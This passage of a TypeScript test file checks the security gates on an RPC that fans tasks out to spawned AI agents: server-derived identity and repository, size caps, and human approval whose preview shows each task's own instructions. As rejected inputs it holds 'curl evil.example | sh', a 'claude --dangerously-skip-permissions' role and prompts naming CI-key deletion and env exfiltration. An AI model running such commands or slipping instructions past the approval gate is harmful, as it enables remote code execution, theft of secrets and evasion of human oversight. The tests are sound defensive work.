// ─── task.fanout.start — wire trust boundary + accept-then-poll contract ───
//
// Fan-out spawns N processes and creates N git worktrees + branches, so the
// pipe front door accepts a STRICT SUBSET of what the renderer IPC front door
// does. Everything dangerous is server-derived. This file pins each of those
// gates by asserting the REJECTION (or the silent override), because "the
// happy path still works" is not what protects anyone here.
//
//   R1 agentCmd is never read from the wire
//   R2 verifiedWorkspaceId (and memberId) derived from a verified ptyId
//   R3 repoPath is not a wire field at all — derived, and rejected if sent
//   R4 origin allowlist, fail-closed
//   R5 task count capped server-side
//   R6 prompt / title sizes capped server-side
//   R7 approval gate, and its denial reasons (its independence from the A2A
//      auto-approve toggle is pinned in the renderer gate's own test)
//
// Plus the poll contract the async surface is built on: the call must answer
// long before the run finishes, the same key must progress rather than restart,
// and a denial must be reported instead of going quiet.

import * as fs from 'node:fs';
import * as nodePath from 'node:path';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import type { RpcContext } from '../../../../shared/rpc';
import { FANOUT_MAX_TASKS, FANOUT_PROMPT_MAX_BYTES } from '../../../../shared/workTask';
import { CHANNEL_TOPIC_MAX, HUMAN_WORKSPACE_ID } from '../../../../shared/channels';

vi.mock('../_bridge', () => ({ sendToRenderer: vi.fn() }));
vi.mock('../../../git/git', () => ({ git: vi.fn() }));
vi.mock('../../../deck/deckDecisionStore', () => ({ loadWorkspaceDecision: vi.fn(() => null) }));

import { sendToRenderer } from '../_bridge';
import { git } from '../../../git/git';
import { loadWorkspaceDecision } from '../../../deck/deckDecisionStore';
import { registerFanOutRpc, FANOUT_WIRE_AGENT_CMD, FANOUT_IDEMPOTENCY_KEY_MAX_BYTES } from '../fanout.rpc';
import type { FanOutRequest, FanOutResult, FanOutService, FanOutStatus } from '../../../worktask/FanOutService';
import type { RpcRouter } from '../../RpcRouter';

const CALLER_WS = 'ws-caller';
// Resolved to NATIVE form. The handler runs the caller's cwd through
// path.resolve() before it reaches git, so on win32 a POSIX '/repo' arrives as
// 'D:\repo' — fixtures written as raw POSIX strings never match what the git
// stub is asked about, and every derivation in this file fails closed.
const CALLER_CWD = nodePath.resolve('/repo/packages/app');
const CALLER_REPO_ROOT = nodePath.resolve('/repo');
/** Where a SIBLING pane in the same workspace is sitting. Nothing the caller
 *  asks for may ever resolve to this — see the R3 sibling-pane test. */
const SIBLING_CWD = nodePath.resolve('/other/project/src');
const SIBLING_REPO_ROOT = nodePath.resolve('/other/project');

type Handler = (params: Record<string, unknown>, ctx?: RpcContext) => Promise<unknown>;

const LOCAL: RpcContext = { origin: 'local' };

/** Verdict the renderer's approval prompt returns, or a failure mode. */
type ApprovalStub = { approved: boolean; outcome?: string } | 'hang' | 'throw';

interface Harness {
  call: (params: Record<string, unknown>, ctx?: RpcContext) => Promise<Record<string, unknown>>;
  /** Invoke with NO second argument at all — the "handler called without a
   *  context" case, which `call`'s default would otherwise paper over. */
  callWithoutCtx: (params: Record<string, unknown>) => Promise<Record<string, unknown>>;
  start: ReturnType<typeof vi.fn>;
  /** Let every already-scheduled callback run — the handler answers the caller
   *  first and does the approval hop detached, so tests that assert on the
   *  detached half must drain it. */
  flush: () => Promise<void>;
  /** How many approval prompts were actually raised. */
  approvalCount: () => number;
  /** Resolve a run that was configured to hang. */
  finishRun: (result?: FanOutResult) => void;
  /** True once the configured run has settled. */
  runFinished: () => boolean;
  /** The FanOutRequest the service was actually handed (asserts on overrides). */
  request: () => FanOutRequest;
  /** Move the CALLER's own surface to another directory — the "it cd'd while
   *  the prompt was up" case the approval-time re-derivation exists for. */
  moveCaller: (cwd: string | null) => void;
  /** The preview the approval prompt was actually raised with. */
  preview: () => string;
  /** Drop a completed key from the service's result LRU — what the real
   *  FanOutService does once 1000 newer fan-outs have finished. */
  forgetResult: (callerKey: string) => void;
  /** Answer a prompt that was left hanging — the "the user took their time"
   *  case the approval-time repo re-derivation is about. */
  approveHungPrompt: () => void;
}

function setup(opts?: {
  ownerWorkspaceId?: string;
  cwd?: string | null;
  approval?: ApprovalStub;
  /** 'hang' models a run that outlives the caller's RPC deadline. */
  run?: 'immediate' | 'hang';
  /** What workspace.list reports as the commander workspace's active pty.
   *  '' models a workspace with no resolvable active pane. */
  commanderAnchorPtyId?: string;
}): Harness {
  const commanderAnchorPtyId =
    opts?.commanderAnchorPtyId === undefined ? 'pty-1' : opts.commanderAnchorPtyId;
  const handlers = new Map<string, Handler>();
  const router = { register: (m: string, h: Handler) => handlers.set(m, h) } as unknown as RpcRouter;

  // A stand-in for the service's own G1 bookkeeping: start() marks the key
  // in-flight synchronously and records the result on completion, exactly as
  // FanOutService does. This is what lets the poll tests below assert a real
  // progression instead of a stubbed one.
  const state = new Map<string, FanOutStatus>();
  let releaseRun: ((r: FanOutResult) => void) | null = null;
  let finished = false;

  const start = vi.fn((req: FanOutRequest): Promise<FanOutResult> => {
    const key = req.idempotencyKey;
    const settle = (result: FanOutResult): FanOutResult => {
      finished = true;
      state.set(key, { state: 'done', result });
      return result;
    };
    state.set(key, { state: 'running' });
    if (opts?.run === 'hang') {
      return new Promise<FanOutResult>((resolve) => {
        releaseRun = (r) => resolve(settle(r));
      });
    }
    return Promise.resolve(settle({ ok: true, tasks: [] }));
  });

  const statusOf = vi.fn((key: string): FanOutStatus => state.get(key) ?? { state: 'unknown' });
  const service = { start, statusOf } as unknown as FanOutService;

  const ownerWs = opts?.ownerWorkspaceId === undefined ? CALLER_WS : opts.ownerWorkspaceId;
  let currentCwd = opts?.cwd === undefined ? CALLER_CWD : opts.cwd;
  const siblingCwd = SIBLING_CWD;
  const approval: ApprovalStub = opts?.approval ?? { approved: true, outcome: 'approved' };
  let approvals = 0;
  let lastPreview = '';
  let releaseApproval: ((v: unknown) => void) | null = null;

  vi.mocked(sendToRenderer).mockImplementation(async (_win, method: string, p?: unknown) => {
    if (method === 'input.findOwnerWorkspace') return ownerWs ? { workspaceId: ownerWs } : {};
    // A brain has no pty of its own, so it anchors on its workspace's ACTIVE
    // pane — which is what workspace.list reports as activePtyId. 'pty-1' here
    // is the same surface a pane caller would identify as, so the commander
    // path and the pty path are asserted against the same repository.
    if (method === 'workspace.list') {
      return [
        { id: 'ws-elsewhere', activePtyId: 'pty-sibling' },
        { id: ownerWs, activePtyId: commanderAnchorPtyId },
      ];
    }
    if (method === 'surface.list') {
      expect((p as Record<string, unknown>)?.workspaceId).toBe(ownerWs);
      // The caller's OWN surface plus a sibling sitting in a different repo —
      // so a test that reads the wrong one lands somewhere visible.
      return [
        { ptyId: 'pty-sibling', cwd: siblingCwd },
        { ptyId: 'pty-1', cwd: currentCwd },
      ];
    }
    if (method === 'fanout.requestApproval') {
      approvals += 1;
      lastPreview = String((p as Record<string, unknown>)?.promptPreview ?? '');
      if (approval === 'throw') throw new Error('renderer unavailable');
      // A prompt nobody has answered YET — the unattended case, and also the
      // handle a test uses to answer it late (approveHungPrompt).
      if (approval === 'hang') {
        return new Promise((resolve) => {
          releaseApproval = resolve as (v: unknown) => void;
        });
      }
      return approval;
    }
    throw new Error(`unexpected renderer call: ${method}`);
  });

  // Every path under the caller's root is the caller's repo, everything under
  // the sibling root is a DIFFERENT repo, and anything else is no repo at all.
  // Matched on the resolved roots, not raw prefixes — see the fixtures above.
  vi.mocked(git).mockImplementation(async (_args: string[], dir: string) => {
    if (dir.startsWith(CALLER_REPO_ROOT)) return { stdout: `${CALLER_REPO_ROOT}\n`, stderr: '', code: 0 };
    if (dir.startsWith(SIBLING_REPO_ROOT)) return { stdout: `${SIBLING_REPO_ROOT}\n`, stderr: '', code: 0 };
    return { stdout: '', stderr: 'not a git repository', code: 128 };
  });

  registerFanOutRpc(router, service, () => null);
  const handler = handlers.get('task.fanout.start');
  if (!handler) throw new Error('task.fanout.start was not registered');

  return {
    call: async (params, ctx = LOCAL) => (await handler(params, ctx)) as Record<string, unknown>,
    callWithoutCtx: async (params) => (await handler(params)) as Record<string, unknown>,
    start,
    flush: () => new Promise<void>((resolve) => setImmediate(resolve)),
    approvalCount: () => approvals,
    finishRun: (result = { ok: true, tasks: [] }) => releaseRun?.(result),
    runFinished: () => finished,
    request: () => start.mock.calls[0][0] as FanOutRequest,
    moveCaller: (next) => {
      currentCwd = next;
    },
    preview: () => lastPreview,
    forgetResult: (callerKey) => state.delete(`${ownerWs}::${callerKey}`),
    approveHungPrompt: () => releaseApproval?.({ approved: true, outcome: 'approved' }),
  };
}

/** Minimum viable accepted call. */
function goodParams(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    idempotencyKey: 'fanout-key-1',
    senderPtyId: 'pty-1',
    titles: ['first task', 'second task'],
    prompt: 'do the thing',
    ...overrides,
  };
}

function errorOf(res: Record<string, unknown>): { code: string; message: string } {
  expect(res.ok).toBe(false);
  return res.error as { code: string; message: string };
}

beforeEach(() => {
  vi.clearAllMocks();
});

describe('task.fanout.start — happy path (so the rejections below mean something)', () => {
  it('accepts, runs detached, and reports the server-chosen repo + workspace', async () => {
    const h = setup();
    const res = await h.call(goodParams());
    expect(res).toMatchObject({
      ok: true,
      status: 'accepted',
      taskCount: 2,
      repoPath: CALLER_REPO_ROOT,
      workspaceId: CALLER_WS,
    });
    await h.flush();
    expect(h.start).toHaveBeenCalledTimes(1);
  });

  it('pairs each title with its own prompt by index', async () => {
    const h = setup();
    await h.call(goodParams({ titles: ['a', 'b'], taskPrompts: ['pa', 'pb'] }));
    await h.flush();
    expect(h.request().titles).toEqual(['a', 'b']);
    expect(h.request().taskPrompts).toEqual(['pa', 'pb']);
  });

  it('keeps the pairing when an empty title is dropped', async () => {
    const h = setup();
    await h.call(goodParams({ titles: ['a', '   ', 'c'], taskPrompts: ['pa', 'pb', 'pc'] }));
    await h.flush();
    expect(h.request().titles).toEqual(['a', 'c']);
    // 'pc' must follow 'c' — not slide onto it from the dropped slot.
    expect(h.request().taskPrompts).toEqual(['pa', 'pc']);
  });
});

// ── the orchestrator brain as a caller ────────────────────────────────────
//
// A brain is a subprocess with no pane ancestry: the PID-map walk always misses
// for it, so it has no senderPtyId and the pty path refuses it forever. Its
// identity is the commander token RpcRouter already validated into
// ctx.commanderWorkspace. Without these paths a brain cannot fan out at all —
// and it has no shell, so it cannot create a worktree any other way either.
describe('a commander brain is a verifiable caller without a pty', () => {
  const COMMANDER: RpcContext = { origin: 'local', commanderWorkspace: CALLER_WS };

  it('accepts a fan-out with no senderPtyId, anchored on its active pane', async () => {
    const h = setup();
    const res = await h.call({ ...goodParams(), senderPtyId: undefined }, COMMANDER);
    expect(res).toMatchObject({
      ok: true,
      status: 'accepted',
      repoPath: CALLER_REPO_ROOT,
      workspaceId: CALLER_WS,
    });
    await h.flush();
    expect(h.start).toHaveBeenCalledTimes(1);
    expect(h.request().verifiedWorkspaceId).toBe(CALLER_WS);
  });

  it('ignores a senderPtyId a commander states — the token outranks it', async () => {
    // Honouring the field would let a brain aim a fan-out at a pane, and so at
    // a repository, outside the workspace its token is bound to.
    const h = setup();
    const res = await h.call(goodParams({ senderPtyId: 'pty-sibling' }), COMMANDER);
    expect(res).toMatchObject({ repoPath: CALLER_REPO_ROOT, workspaceId: CALLER_WS });
  });

  it('still requires an approval — a brain caller is not a pre-approved one', async () => {
    const h = setup({ approval: { approved: false, outcome: 'declined' } });
    await h.call({ ...goodParams(), senderPtyId: undefined }, COMMANDER);
    await h.flush();
    expect(h.approvalCount()).toBe(1);
    expect(h.start).not.toHaveBeenCalled();
  });

  it('fails closed when the commander workspace has no resolvable active pane', async () => {
    const h = setup({ commanderAnchorPtyId: '' });
    const res = await h.call({ ...goodParams(), senderPtyId: undefined }, COMMANDER);
    expect(errorOf(res).code).toBe('FAILED_PRECONDITION');
    expect(h.approvalCount()).toBe(0);
  });

  it('keeps its idempotency keys out of the pane agents\' key space', async () => {
    // Keys are caller-chosen strings. A brain polling an obvious key like
    // "fanout-1" must not read a pane agent's fan-out result — task ids,
    // branches, worktree paths — nor have its own start answered as that
    // agent's poll.
    const h = setup();
    await h.call(goodParams({ idempotencyKey: 'shared' }));
    await h.flush();
    const paneKey = h.request().idempotencyKey;

    const h2 = setup();
    await h2.call({ ...goodParams({ idempotencyKey: 'shared' }), senderPtyId: undefined }, COMMANDER);
    await h2.flush();
    expect(h2.request().idempotencyKey).not.toBe(paneKey);
  });

  it('leaves the pty path fail-closed for a NON-commander with no pty', async () => {
    const h = setup();
    const res = await h.call({ ...goodParams(), senderPtyId: undefined });
    expect(errorOf(res).code).toBe('NOT_AUTHORIZED');
  });
});

// ── per-task roles ────────────────────────────────────────────────────────
//
// Roles are how one fan-out lands on more than one agent/model. The wire
// carries a role NAME, never a command: the agent command is interpolated
// unquoted into a shell line downstream, which is why R1 rejects agentCmd
// outright. A closed vocabulary keeps the capability without reopening that.
describe('roles choose the agent per task, without naming one', () => {
  it('forwards index-aligned roles to the service', async () => {
    const h = setup();
    await h.call(goodParams({ titles: ['a', 'b'], roles: ['Builder', 'Reviewer'] }));
    await h.flush();
    expect(h.request().roles).toEqual(['Builder', 'Reviewer']);
  });

  it('keeps role pairing when an empty title is dropped', async () => {
    const h = setup();
    await h.call(goodParams({ titles: ['a', '  ', 'c'], roles: ['Builder', 'Tester', 'Reviewer'] }));
    await h.flush();
    expect(h.request().titles).toEqual(['a', 'c']);
    expect(h.request().roles).toEqual(['Builder', 'Reviewer']);
  });

  it('rejects an unknown role instead of silently using the default agent', async () => {
    const h = setup();
    const res = await h.call(goodParams({ roles: ['Builder', 'Overlord'] }));
    expect(errorOf(res).code).toBe('INVALID_ARGUMENT');
    expect(h.approvalCount()).toBe(0);
  });

  it('rejects a command smuggled in as a role', async () => {
    const h = setup();
    const res = await h.call(goodParams({ roles: ['claude --dangerously-skip-permissions'] }));
    expect(errorOf(res).code).toBe('INVALID_ARGUMENT');
  });

  it('shows the role in what the operator approves', async () => {
    // Approving a prompt is not approving whatever agent the caller picked to
    // run it, so the role has to be visible in the preview.
    const h = setup();
    await h.call(goodParams({ titles: ['a', 'b'], roles: ['Builder', 'Reviewer'] }));
    await h.flush();
    expect(h.preview()).toContain('role: Builder');
    expect(h.preview()).toContain('role: Reviewer');
  });

  it('rejects more roles than titles instead of dropping the extras', async () => {
    const h = setup();
    const res = await h.call(goodParams({ titles: ['a', 'b'], roles: ['Builder', 'Reviewer', 'Tester'] }));
    expect(errorOf(res).code).toBe('INVALID_ARGUMENT');
  });

  it('omits roles entirely when the caller sent none', async () => {
    const h = setup();
    await h.call(goodParams());
    await h.flush();
    expect(h.request().roles).toEqual(['', '']);
  });
});

// ── accept-then-poll ──────────────────────────────────────────────────────
//
// The MCP client's RPC deadline is 10s (src/mcp/wmux-client.ts) and a single
// task's renderer spawn alone is allowed 30s. A synchronous handler would time
// the caller out BY CONSTRUCTION while the fan-out succeeded behind it, and the
// client's retry would then re-fire it.  So the response must not depend on the
// run.
describe('the caller is answered without waiting for the fan-out', () => {
  it('returns accepted while the run is still in flight', async () => {
    // The run never settles on its own. If the handler awaited it (the
    // pre-merge behaviour), this call would never resolve and the test times
    // out — which is exactly the regression signal we want.
    const h = setup({ run: 'hang' });
    const res = await h.call(goodParams());
    expect(res).toMatchObject({ ok: true, status: 'accepted' });
    await h.flush();
    expect(h.start).toHaveBeenCalledTimes(1);
    expect(h.runFinished()).toBe(false);
    h.finishRun();
  });

  it('returns accepted while the APPROVAL prompt is still up', async () => {
    // Same argument one layer earlier: the user may take longer to answer than
    // the caller's deadline, so the prompt must not be on the response path.
    const h = setup({ approval: 'hang' });
    const res = await h.call(goodParams());
    expect(res).toMatchObject({ ok: true, status: 'accepted' });
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('progresses accepted → running → completed for the same key', async () => {
    const h = setup({ run: 'hang' });

    expect(await h.call(goodParams())).toMatchObject({ status: 'accepted' });
    await h.flush();

    expect(await h.call(goodParams())).toMatchObject({ ok: true, status: 'running' });

    const result: FanOutResult = {
      ok: true,
      tasks: [{ index: 0, title: 'first task', ok: true, taskId: 'wtask-1' }],
    };
    h.finishRun(result);
    await h.flush();

    expect(await h.call(goodParams())).toMatchObject({ ok: true, status: 'completed', result });
    // Three calls, ONE run: polling must never re-fan-out.
    expect(h.start).toHaveBeenCalledTimes(1);
  });

  it('reports awaiting_approval, and does not raise a second prompt for the same key', async () => {
    const h = setup({ approval: 'hang' });
    await h.call(goodParams());
    await h.flush();

    expect(await h.call(goodParams())).toMatchObject({ ok: true, status: 'awaiting_approval' });
    expect(h.approvalCount()).toBe(1);
    expect(h.start).not.toHaveBeenCalled();
  });

  it('answers a known key WITHOUT re-deriving the repository', async () => {
    const h = setup({ run: 'hang' });
    await h.call(goodParams());
    await h.flush();
    vi.mocked(git).mockClear();
    await h.call(goodParams());
    expect(vi.mocked(git)).not.toHaveBeenCalled();
  });

  it('scopes the poll key to the calling workspace, so a guessed key reads nothing', async () => {
    // Keys are caller-chosen strings; without the workspace scoping, guessing
    // "fanout-key-1" would hand a neighbour the full FanOutResult (task ids,
    // branches, worktree paths).
    const h = setup({ run: 'hang' });
    await h.call(goodParams());
    await h.flush();
    expect(h.request().idempotencyKey).toContain(CALLER_WS);
    expect(h.request().idempotencyKey).not.toBe('fanout-key-1');
  });
});

// ── terminal states survive eviction ──────────────────────────────────────
//
// Both bookkeeping stores are bounded. The gate map used to evict its oldest
// entry regardless of phase, so a `started` or `denied` key could fall out of
// it AND out of the service's result LRU — after which the poll saw `unknown`,
// fell through as a NEW request, and the caller got a second approval prompt
// and a full re-execution of tasks that had already spawned. Terminal states
// now live in a body-free tombstone map with a much larger cap.
describe('an evicted key can never restart a fan-out that already spawned', () => {
  /** Push `n` unrelated fan-outs through, each of which terminates. */
  async function flood(h: Harness, n: number): Promise<void> {
    for (let k = 0; k < n; k += 1) {
      await h.call(goodParams({ idempotencyKey: `filler-${k}` }));
      await h.flush();
    }
  }

  it('answers expired — not a fresh request — after eviction pressure on both stores', async () => {
    const h = setup();
    await h.call(goodParams({ idempotencyKey: 'the-real-one' }));
    await h.flush();
    expect(h.start).toHaveBeenCalledTimes(1);

    // The service forgets the result, and enough newer fan-outs go through to
    // push the key past the gate map's own cap.
    h.forgetResult('the-real-one');
    await flood(h, 1100);

    const res = await h.call(goodParams({ idempotencyKey: 'the-real-one' }));
    await h.flush();
    expect(res).toMatchObject({ ok: false, status: 'expired' });
    // The one thing that must not happen: a second run of the same key.
    expect(h.start.mock.calls.filter((c) => (c[0] as FanOutRequest).idempotencyKey.endsWith('the-real-one'))).toHaveLength(1);
  });

  it('keeps a denial terminal under the same pressure, instead of re-prompting', async () => {
    const h = setup({ approval: { approved: false, outcome: 'declined' } });
    await h.call(goodParams({ idempotencyKey: 'denied-one' }));
    await h.flush();
    const before = h.approvalCount();

    await flood(h, 1100);

    const res = await h.call(goodParams({ idempotencyKey: 'denied-one' }));
    await h.flush();
    expect(res).toMatchObject({ ok: false, status: 'denied', reason: 'declined' });
    // Exactly one prompt was raised for THIS key across the whole sequence.
    expect(h.approvalCount()).toBe(before + 1100);
  });
});

// ── one key, one prompt ───────────────────────────────────────────────────
describe('concurrent calls on one key raise one prompt', () => {
  it('answers the second concurrent caller as a poll', async () => {
    // The gate used to be claimed after two renderer round-trips and a git
    // call, so both callers observed no gate and both raised a dialog —
    // indistinguishable on screen while carrying different payloads.
    const h = setup({ approval: 'hang' });
    const [first, second] = await Promise.all([
      h.call(goodParams({ prompt: 'benign' })),
      h.call(goodParams({ prompt: 'hostile' })),
    ]);
    await h.flush();
    const statuses = [first.status, second.status].sort();
    expect(statuses).toEqual(['accepted', 'awaiting_approval']);
    expect(h.approvalCount()).toBe(1);
  });

  it('releases the key when the repository cannot be derived, so a retry is not bricked', async () => {
    const h = setup({ cwd: null });
    expect(errorOf(await h.call(goodParams())).code).toBe('FAILED_PRECONDITION');
    // Same key again, now resolvable: it must behave as a new request rather
    // than answering awaiting_approval forever.
    h.moveCaller(CALLER_CWD);
    expect(await h.call(goodParams())).toMatchObject({ ok: true, status: 'accepted' });
  });
});

describe('the idempotency key is bounded', () => {
  it('rejects a key large enough to be a payload', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ idempotencyKey: 'k'.repeat(FANOUT_IDEMPOTENCY_KEY_MAX_BYTES + 1) })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
    // Rejected before any identity or repo work.
    expect(vi.mocked(sendToRenderer)).not.toHaveBeenCalled();
  });

  it(`accepts exactly ${FANOUT_IDEMPOTENCY_KEY_MAX_BYTES} bytes`, async () => {
    const h = setup();
    const res = await h.call(goodParams({ idempotencyKey: 'k'.repeat(FANOUT_IDEMPOTENCY_KEY_MAX_BYTES) }));
    expect(res).toMatchObject({ ok: true, status: 'accepted' });
  });
});

// ── R7 — approval gate ────────────────────────────────────────────────────
describe('R7 — the fan-out is approved before anything spawns', () => {
  it('starts nothing when the user denies', async () => {
    const h = setup({ approval: { approved: false, outcome: 'declined' } });
    await h.call(goodParams());
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('reports the denial on the poll instead of going quiet', async () => {
    const h = setup({ approval: { approved: false, outcome: 'declined' } });
    await h.call(goodParams());
    await h.flush();
    const res = await h.call(goodParams());
    expect(res).toMatchObject({ ok: false, status: 'denied', reason: 'declined' });
    expect(errorOf(res).code).toBe('NOT_AUTHORIZED');
  });

  it('distinguishes an unattended auto-deny from a real denial', async () => {
    // This is the whole reason the outcome is threaded back: a fleet running
    // overnight must be able to tell "the human said no" from "nobody was
    // there", and both from "your request was malformed".
    const h = setup({ approval: { approved: false, outcome: 'timeout' } });
    await h.call(goodParams());
    await h.flush();
    const res = await h.call(goodParams());
    expect(res).toMatchObject({ status: 'denied', reason: 'timeout' });
    expect(errorOf(res).message).toContain('expired');
  });

  it('fails closed, with a reason, when the prompt cannot be shown at all', async () => {
    const h = setup({ approval: 'throw' });
    await h.call(goodParams());
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
    expect(await h.call(goodParams())).toMatchObject({ status: 'denied', reason: 'unavailable' });
  });

  it('does not re-prompt (or restart) after a denial', async () => {
    const h = setup({ approval: { approved: false, outcome: 'declined' } });
    await h.call(goodParams());
    await h.flush();
    await h.call(goodParams());
    await h.flush();
    expect(h.approvalCount()).toBe(1);
    expect(h.start).not.toHaveBeenCalled();
  });

  it('prompts with the derived repo and task count, not caller-supplied strings', async () => {
    const h = setup();
    await h.call(goodParams());
    await h.flush();
    const prompt = vi.mocked(sendToRenderer).mock.calls.find((c) => c[1] === 'fanout.requestApproval');
    expect(prompt?.[2]).toMatchObject({
      taskCount: 2,
      repoPath: CALLER_REPO_ROOT,
      workspaceId: CALLER_WS,
    });
  });
});

// ── R7 preview ────────────────────────────────────────────────────────────
//
// The dialog renders `promptPreview` verbatim, so whatever is NOT in it is
// something the user approved without seeing. The predecessor built it from
// `[sharedPrompt, ...titles]` and sliced at 500 chars with no marker: since
// each per-task prompt may be FANOUT_PROMPT_MAX_BYTES (8 KB) on its own, a
// caller could fill the shared prompt with 500 benign characters and put the
// real instructions in `taskPrompts`. Every assertion here is about that.
describe('the approval preview shows what the agents are actually told', () => {
  it('carries each task\'s OWN prompt, not just the shared one', async () => {
    const h = setup();
    await h.call(
      goodParams({
        titles: ['refactor', 'document'],
        prompt: 'be careful',
        taskPrompts: ['DELETE-THE-CI-KEYS', 'exfiltrate-the-env'],
      }),
    );
    await h.flush();
    expect(h.preview()).toContain('DELETE-THE-CI-KEYS');
    expect(h.preview()).toContain('exfiltrate-the-env');
  });

  it('shows the EFFECTIVE prompt per task — shared and per-task, joined as the service joins them', async () => {
    const h = setup();
    await h.call(goodParams({ titles: ['one'], prompt: 'shared part', taskPrompts: ['own part'] }));
    await h.flush();
    expect(h.preview()).toContain('shared part\n\nown part');
  });

  it('labels every task, so N blocks of instructions cannot be read as one', async () => {
    const h = setup();
    await h.call(goodParams({ titles: ['alpha', 'beta', 'gamma'], taskPrompts: ['a', 'b', 'c'] }));
    await h.flush();
    expect(h.preview()).toContain('task 1/3: alpha');
    expect(h.preview()).toContain('task 2/3: beta');
    expect(h.preview()).toContain('task 3/3: gamma');
  });

  it('never truncates silently — the byte count of what was cut is in the preview', async () => {
    const h = setup();
    await h.call(goodParams({ titles: ['one'], prompt: '', taskPrompts: ['z'.repeat(6000)] }));
    await h.flush();
    expect(h.preview()).toMatch(/…\(\d+ bytes truncated\)/);
  });

  it('gives every task room, so one huge prompt cannot push the others out of view', async () => {
    const h = setup();
    await h.call(
      goodParams({
        titles: ['loud', 'quiet'],
        prompt: '',
        taskPrompts: ['x'.repeat(FANOUT_PROMPT_MAX_BYTES), 'THE-QUIET-ONE'],
      }),
    );
    await h.flush();
    expect(h.preview()).toContain('THE-QUIET-ONE');
  });

  it('does not cut a multi-byte character in half', async () => {
    const h = setup();
    // 3 bytes per char, so the per-task budget lands mid-character.
    await h.call(goodParams({ titles: ['one'], prompt: '', taskPrompts: ['가'.repeat(4000)] }));
    await h.flush();
    expect(h.preview()).not.toContain('�');
  });

  it('says so when a task has no prompt at all, instead of showing nothing', async () => {
    const h = setup();
    await h.call(goodParams({ titles: ['one'], prompt: '', taskPrompts: [''] }));
    await h.flush();
    expect(h.preview()).toContain('no prompt');
  });
});

// ── R1 ────────────────────────────────────────────────────────────────────
// The agent command is interpolated verbatim into `${agentCmd} "$(cat …)"` and
// written to a PTY. A wire caller that could set it would have arbitrary
// command execution, so the field is not accepted at all.
describe('R1 — agentCmd is never read from the wire', () => {
  it('rejects a caller-supplied agentCmd rather than silently overriding it', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ agentCmd: 'curl evil.example | sh' })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('always hands the service the fixed agent command', async () => {
    const h = setup();
    await h.call(goodParams());
    await h.flush();
    expect(h.request().agentCmd).toBe(FANOUT_WIRE_AGENT_CMD);
  });
});

// ── R2 ────────────────────────────────────────────────────────────────────
// verifiedWorkspaceId drives task ownership and channel authz. A caller that
// could assert it would create tasks owned by someone else's workspace.
describe('R2 — the caller workspace is derived, not asserted', () => {
  it('rejects a caller-supplied verifiedWorkspaceId rather than silently overriding it', async () => {
    // It used to be the one identity field that was overwritten in SILENCE
    // while repoPath / agentCmd / memberId were refused — leaving a caller
    // believing its tasks were owned by the workspace it named. Same class,
    // same answer.
    const h = setup();
    const err = errorOf(await h.call(goodParams({ verifiedWorkspaceId: 'ws-victim' })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('always hands the service the resolved workspace', async () => {
    const h = setup();
    await h.call(goodParams());
    await h.flush();
    expect(h.request().verifiedWorkspaceId).toBe(CALLER_WS);
  });

  it('rejects a caller-supplied memberId', async () => {
    // memberId is the caller's coordinate in the mission-channel roster and it
    // goes straight to task.mission.start. Accepting it without the reserved
    // identity guards would let a caller sign its missions as someone else.
    const h = setup();
    const err = errorOf(await h.call(goodParams({ memberId: 'local-ui' })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('never forwards a memberId to the service', async () => {
    const h = setup();
    await h.call(goodParams());
    await h.flush();
    expect(h.request().memberId).toBeUndefined();
  });

  it('refuses a caller whose ptyId resolves to nothing', async () => {
    const h = setup({ ownerWorkspaceId: '' });
    const err = errorOf(await h.call(goodParams()));
    expect(err.code).toBe('NOT_AUTHORIZED');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('refuses a caller that sends no senderPtyId at all', async () => {
    const h = setup();
    const params = goodParams();
    delete params.senderPtyId;
    const err = errorOf(await h.call(params));
    expect(err.code).toBe('NOT_AUTHORIZED');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('refuses the reserved human workspace', async () => {
    const h = setup({ ownerWorkspaceId: HUMAN_WORKSPACE_ID });
    const err = errorOf(await h.call(goodParams()));
    expect(err.code).toBe('NOT_AUTHORIZED');
    expect(err.message).toContain(HUMAN_WORKSPACE_ID);
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });
});

// ── R3 ────────────────────────────────────────────────────────────────────
// Unconstrained repoPath means `git worktree add` plus a new branch in any
// repository on disk. It is not a wire field: a caller that believes it chose
// the repository and was silently overruled is acting on a false picture, so
// sending one is refused outright.
describe("R3 — the repository is derived from the caller's own workspace", () => {
  it('rejects any caller-supplied repoPath, even its own repo', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ repoPath: CALLER_REPO_ROOT })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects a path in a different repository', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ repoPath: '/elsewhere/project' })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('normalises the caller cwd to the git TOPLEVEL, not the cwd itself', async () => {
    const h = setup();
    await h.call(goodParams());
    await h.flush();
    expect(h.request().repoPath).toBe(CALLER_REPO_ROOT);
    expect(h.request().repoPath).not.toBe(CALLER_CWD);
  });

  it('refuses when the caller workspace has no working directory', async () => {
    const h = setup({ cwd: null });
    const err = errorOf(await h.call(goodParams()));
    expect(err.code).toBe('FAILED_PRECONDITION');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('refuses when the caller workspace is not inside a git repository', async () => {
    const h = setup({ cwd: '/tmp/scratch' });
    const err = errorOf(await h.call(goodParams()));
    expect(err.code).toBe('FAILED_PRECONDITION');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('refuses a flag-shaped cwd without handing it to git', async () => {
